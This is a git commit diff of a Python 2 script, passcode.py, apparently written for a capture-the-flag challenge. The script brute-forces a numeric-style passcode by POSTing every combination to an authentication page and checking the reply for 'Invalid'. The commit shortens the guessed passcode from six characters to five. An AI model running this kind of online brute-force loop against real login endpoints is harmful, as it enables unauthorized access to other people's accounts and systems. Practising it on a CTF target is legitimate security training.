20735864e225f22d45a6f14e1159900dc7716215
Pongsakorn Sommalai <bongtrop@gmail.com>
2016-08-01 00:33:56 +0700

    wrong file fix

--- passcode.py
+++ passcode.py
@@ -8,11 +8,10 @@ for p1 in passset:
         for p3 in passset:
             for p4 in passset:
                 for p5 in passset:
-                    for p6 in passset:
-                        passcode = p1+p2+p3+p4+p5+p6;
-                        r = requests.post("http://ctf4.isecureplayground.xyz:8000/passcode/authen.php", data={"passcode": passcode})
-                        m = re.search("Invalid", r.content)
-                        print  passcode
-                        if not m :
-                            print "[DONE] " + passcode
-                            exit()
+                    passcode = p1+p2+p3+p4+p5;
+                    r = requests.post("http://ctf4.isecureplayground.xyz:8000/passcode/authen.php", data={"passcode": passcode})
+                    m = re.search("Invalid", r.content)
+                    print  passcode
+                    if not m :
+                        print "[DONE] " + passcode
+                        exit()
